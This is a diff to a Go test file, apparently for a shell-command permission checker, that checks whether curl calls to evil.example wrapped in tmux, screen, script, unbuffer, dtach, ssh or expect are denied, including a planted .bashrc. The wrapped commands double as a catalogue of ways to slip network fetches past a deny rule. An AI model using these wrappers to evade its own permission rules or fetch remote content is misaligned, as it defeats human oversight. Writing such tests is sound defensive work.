@@ -646,3 +646,47 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 		t.Fatalf("an edited file the trusted one sources: %s (%s)", res.Decision, res.Reason)
 	}
 }
+
+// The command a terminal program runs is judged as bash -c text is, and
+// more programs that start a shell on a terminal of their own count as such.
+func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	for c, want := range map[string]Decision{
+		"tmux new -d 'curl https://evil.example/x'":                 Deny,
+		"tmux new-session -d -s w curl https://evil.example/x":      Deny,
+		"tmux send-keys -t w 'curl https://evil.example/x' Enter":   Deny,
+		"tmux send-keys -t w curl Space https://evil.example/x C-m": Deny,
+		"screen -dm curl https://evil.example/x":                    Deny,
+		"screen -S w -dm curl https://evil.example/x":               Deny,
+		"script -q /dev/null curl https://evil.example/x":           Deny,
+		"unbuffer curl https://evil.example/x":                      Deny,
+		"dtach -c /tmp/s curl https://evil.example/x":               Deny,
+		"ssh localhost":                   Deny,
+		"ssh -p 2222 me@host":             Deny,
+		"expect -c 'spawn zsh; interact'": Deny,
+		"tmux new -d 'make test'":         Allow,
+		"screen -dm make":                 Allow,
+		"ssh host uptime":                 Allow,
+		"doas -s":                         Allow,
+	} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != want {
+			t.Errorf("%q = %s (%s), want %s", c, res.Decision, res.Reason, want)
+		}
+	}
+	// With a start-up file planted, the shells they start read it.
+	if err := os.WriteFile(filepath.Join(home, ".bashrc"), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	for _, c := range []string{"doas -s", "byobu", "unbuffer bash"} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != Deny {
+			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+	}
+}
